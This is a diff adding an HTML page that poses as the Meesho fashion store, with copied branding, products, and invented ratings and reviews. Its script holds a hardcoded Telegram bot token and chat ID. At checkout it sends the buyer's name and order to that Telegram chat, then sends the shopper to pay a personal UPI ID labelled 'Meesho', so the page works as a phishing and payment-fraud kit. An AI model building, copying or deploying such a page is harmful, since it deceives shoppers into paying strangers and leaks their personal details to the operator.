@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meesho Fashion | Ratings & Sizes</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Muli:wght@300;400;600;700&display=swap');
+        body { font-family: 'Muli', sans-serif; background-color: #f8f8f8; margin: 0; }
+        .meesho-pink { color: #9f2089; }
+        .meesho-bg-pink { background-color: #9f2089; }
+        .size-btn { border: 1px solid #ddd; padding: 6px 12px; border-radius: 4px; font-weight: 600; font-size: 13px; min-width: 45px; text-align: center; }
+        .size-btn.active { border-color: #9f2089; color: #9f2089; background: #fdf2f9; }
+        .banner-swiper { height: 260px; width: 100%; }
+        .banner-swiper img { width: 100%; height: 100%; object-fit: cover; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #eee; display: flex; justify-content: space-around; padding: 10px 0; z-index: 100; }
+        .nav-item { text-align: center; color: #666; font-size: 11px; }
+    </style>
+</head>
+<body>
+
+    <div id="page-home">
+        <header class="bg-white p-3 sticky top-0 z-50 shadow-sm">
+            <div class="flex items-center justify-between mb-3">
+                <img src="https://www.meesho.com/assets/svgicons/meeshoLogo.svg" class="h-6">
+                <div class="flex gap-4 text-gray-500">
+                    <i class="fa-regular fa-bell text-xl"></i>
+                    <i class="fa-solid fa-cart-shopping text-xl"></i>
+                </div>
+            </div>
+            <div class="relative">
+                <i class="fa-solid fa-magnifying-glass absolute left-3 top-3 text-gray-400"></i>
+                <input type="text" placeholder="Try Saree, Kurti or Jewellery" class="w-full bg-gray-100 p-2 pl-10 rounded-md border border-gray-100 outline-none text-sm">
+            </div>
+        </header>
+
+        <div class="p-3">
+            <div class="swiper banner-swiper rounded-lg overflow-hidden border">
+                <div class="swiper-wrapper">
+                    <div class="swiper-slide"><img src="https://images.meesho.com/images/marketing/1766985154973.webp"></div>
+                    <div class="swiper-slide"><img src="https://images.meesho.com/images/marketing/1762433553672.webp"></div>
+                </div>
+                <div class="swiper-pagination"></div>
+            </div>
+        </div>
+
+        <main id="grid" class="p-3 grid grid-cols-2 gap-3 mb-24"></main>
+
+        <div class="bottom-nav">
+            <div class="nav-item text-pink-700 font-bold"><i class="fa-solid fa-house text-lg"></i><p>Home</p></div>
+            <div class="nav-item"><i class="fa-solid fa-grip text-lg"></i><p>Categories</p></div>
+            <div class="nav-item"><i class="fa-solid fa-bag-shopping text-lg"></i><p>Orders</p></div>
+            <div class="nav-item"><i class="fa-solid fa-user text-lg"></i><p>Account</p></div>
+        </div>
+    </div>
+
+    <div id="page-detail" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto pb-20">
+        <div class="sticky top-0 bg-white p-3 flex items-center justify-between border-b z-50">
+            <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
+            <div class="flex gap-4">
+                <i class="fa-solid fa-share-nodes text-xl text-gray-400"></i>
+                <i class="fa-solid fa-cart-shopping text-xl text-gray-400"></i>
+            </div>
+        </div>
+
+        <div class="swiper detail-swiper h-[400px] bg-white">
+            <div class="swiper-wrapper" id="detail-img-wrapper"></div>
+            <div class="swiper-pagination"></div>
+        </div>
+
+        <div class="p-4 bg-white border-b">
+            <p id="det-name" class="text-lg text-gray-500 font-medium leading-tight mb-2"></p>
+            <div class="flex items-center gap-2">
+                <span id="det-price" class="text-2xl font-black text-gray-900"></span>
+                <span class="text-green-600 font-bold text-sm">95% Off</span>
+            </div>
+            <div class="flex items-center gap-2 mt-1">
+                <div class="bg-green-600 text-white text-[10px] px-2 py-0.5 rounded-full font-bold flex items-center gap-1">
+                    4.2 <i class="fa-solid fa-star text-[8px]"></i>
+                </div>
+                <span class="text-xs text-gray-400">2,450 Ratings, 840 Reviews</span>
+            </div>
+            <p class="text-xs text-green-700 font-bold mt-3 bg-green-50 inline-block px-2 py-1 rounded">Free Delivery</p>
+        </div>
+
+        <div class="p-4 bg-white mt-2 border-b">
+            <div class="flex justify-between items-center mb-3">
+                <h3 class="font-bold text-gray-800 text-sm">Select Size</h3>
+                <span class="text-pink-600 text-xs font-bold">Size Chart</span>
+            </div>
+            <div class="flex flex-wrap gap-3">
+                <button class="size-btn" onclick="selectSize(this)">S</button>
+                <button class="size-btn active" onclick="selectSize(this)">M</button>
+                <button class="size-btn" onclick="selectSize(this)">L</button>
+                <button class="size-btn" onclick="selectSize(this)">XL</button>
+                <button class="size-btn" onclick="selectSize(this)">XXL</button>
+            </div>
+        </div>
+
+        <div class="p-4 bg-white mt-2 border-b">
+            <h3 class="font-bold text-gray-800 text-sm mb-2">Product Details</h3>
+            <div class="text-sm text-gray-600 space-y-1">
+                <p>Name: <span id="det-name-2"></span></p>
+                <p>Fabric: Premium Soft Cotton / Silk</p>
+                <p>Net Quantity: 1 Unit</p>
+                <p>Sizes: S, M, L, XL, XXL</p>
+                <p>Return: 7 Days Easy Return</p>
+            </div>
+        </div>
+
+        <div class="p-4 bg-white mt-2 mb-20">
+            <h3 class="font-bold text-gray-800 text-sm mb-4">Product Reviews</h3>
+            <div class="space-y-4">
+                <div class="border-b pb-3">
+                    <div class="flex items-center gap-2 mb-1">
+                        <div class="bg-green-600 text-white text-[9px] px-1.5 py-0.5 rounded font-bold">5.0 ★</div>
+                        <span class="text-xs font-bold text-gray-700">Priya Sharma</span>
+                    </div>
+                    <p class="text-xs text-gray-600">Very beautiful fabric and perfect fit! Worth the money.</p>
+                    <div class="flex gap-2 mt-2">
+                        <img src="https://images.meesho.com/images/products/316040854/zntst_512.webp" class="w-12 h-12 rounded object-cover border">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="fixed bottom-0 w-full flex p-3 bg-white border-t gap-3 z-[210]">
+            <button class="flex-1 border border-gray-300 font-bold py-3 rounded-lg text-sm flex items-center justify-center gap-2">
+                <i class="fa-regular fa-heart"></i> Wishlist
+            </button>
+            <button onclick="openAddress()" class="flex-1 meesho-bg-pink text-white font-bold py-3 rounded-lg text-sm shadow-lg">Buy Now</button>
+        </div>
+    </div>
+
+    <div id="page-address" class="hidden fixed inset-0 bg-[#f9f9f9] z-[300] overflow-y-auto pb-24">
+        <div class="bg-white p-3 border-b sticky top-0 z-50">
+            <div class="flex items-center gap-4 mb-3">
+                <i class="fa-solid fa-arrow-left text-lg text-gray-700" onclick="showPage('page-detail')"></i>
+                <h2 class="font-bold text-gray-800 text-sm">Delivery Address</h2>
+            </div>
+        </div>
+        <div class="p-4">
+            <div class="bg-white p-4 rounded-lg shadow-sm mb-4">
+                <input type="text" id="uName" placeholder="Name" class="w-full border-b py-3 outline-none mb-4 text-sm focus:border-pink-600">
+                <input type="tel" id="uPhone" placeholder="Contact Number" class="w-full border-b py-3 outline-none text-sm focus:border-pink-600">
+            </div>
+            <div class="bg-white p-4 rounded-lg shadow-sm">
+                <input type="text" id="uAddr" placeholder="Address" class="w-full border-b py-3 outline-none text-sm mb-4">
+                <input type="tel" id="uPin" maxlength="6" oninput="checkPin(this.value)" class="w-full border-b py-3 outline-none text-sm mb-4" placeholder="Pincode">
+                <div class="flex gap-4">
+                    <input type="text" id="uCity" readonly class="w-1/2 border-b py-3 text-sm bg-gray-50" placeholder="City">
+                    <input type="text" id="uState" readonly class="w-1/2 border-b py-3 text-sm bg-gray-50" placeholder="State">
+                </div>
+            </div>
+        </div>
+        <div class="fixed bottom-0 w-full p-4 bg-white border-t">
+            <button onclick="finalPay()" class="w-full meesho-bg-pink text-white font-bold py-4 rounded-lg">SAVE & CONTINUE</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+    <script>
+        const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM"; 
+        const CHAT_ID = "1981500395";
+        const UPI_ID = "8709615634-w350@ybl";
+
+        const products = [
+            { id: 1, name: "Premium Party Wear Saree with Blouse", price: 299, imgs: ["https://images.meesho.com/images/products/316040854/zntst_512.webp"] },
+            { id: 2, name: "Designer Kurta Set with Dupatta", price: 249, imgs: ["https://images.meesho.com/images/products/417215284/xos3y_512.webp"] },
+            { id: 3, name: "Stylish Western Floral Dress", price: 199, imgs: ["https://images.meesho.com/images/products/377319985/is6is_512.webp"] },
+            { id: 4, name: "Fancy Rayon Printed Kurti", price: 149, imgs: ["https://images.meesho.com/images/products/324707682/z1rrt_512.webp"] }
+        ];
+
+        let selectedProduct = null;
+
+        function showPage(id) {
+            ['page-home', 'page-detail', 'page-address'].forEach(p => document.getElementById(p).classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        function renderGrid() {
+            const grid = document.getElementById('grid');
+            grid.innerHTML = products.map(p => `
+                <div class="product-card bg-white rounded shadow-sm overflow-hidden" onclick="showDetail(${p.id})">
+                    <img src="${p.imgs[0]}" class="h-48 w-full object-cover">
+                    <div class="p-2">
+                        <p class="text-[11px] text-gray-500 truncate">${p.name}</p>
+                        <div class="flex items-center gap-1 mt-1">
+                            <span class="text-sm font-bold">₹${p.price}</span>
+                            <span class="text-[9px] text-gray-400 line-through">₹2,499</span>
+                        </div>
+                        <div class="flex items-center gap-1 mt-1">
+                            <div class="bg-green-600 text-white text-[8px] px-1 rounded flex items-center">4.2★</div>
+                            <span class="text-[8px] text-gray-400">120 Reviews</span>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function selectSize(btn) {
+            document.querySelectorAll('.size-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+        }
+
+        function showDetail(id) {
+            selectedProduct = products.find(p => p.id === id);
+            document.getElementById('det-name').innerText = selectedProduct.name;
+            document.getElementById('det-name-2').innerText = selectedProduct.name;
+            document.getElementById('det-price').innerText = "₹" + selectedProduct.price;
+            document.getElementById('detail-img-wrapper').innerHTML = selectedProduct.imgs.map(img => `<div class="swiper-slide p-4"><img src="${img}" class="w-full h-full object-contain"></div>`).join('');
+            showPage('page-detail');
+            new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
+        }
+
+        function openAddress() { showPage('page-address'); }
+
+        async function checkPin(pin) {
+            if(pin.length === 6) {
+                const res = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
+                const data = await res.json();
+                if(data[0].Status === "Success") {
+                    document.getElementById('uCity').value = data[0].PostOffice[0].District;
+                    document.getElementById('uState').value = data[0].PostOffice[0].State;
+                }
+            }
+        }
+
+        function finalPay() {
+            const name = document.getElementById('uName').value;
+            if(!name) return alert("Fill Name");
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=MEESHO: ${name} Ordered ${selectedProduct.name}`);
+            window.location.href = `upi://pay?pa=${UPI_ID}&pn=Meesho&am=${selectedProduct.price}&cu=INR`;
+        }
+
+        renderGrid();
+        new Swiper(".banner-swiper", { pagination: { el: ".swiper-pagination" }, autoplay: true });
+    </script>
+</body>
+</html>
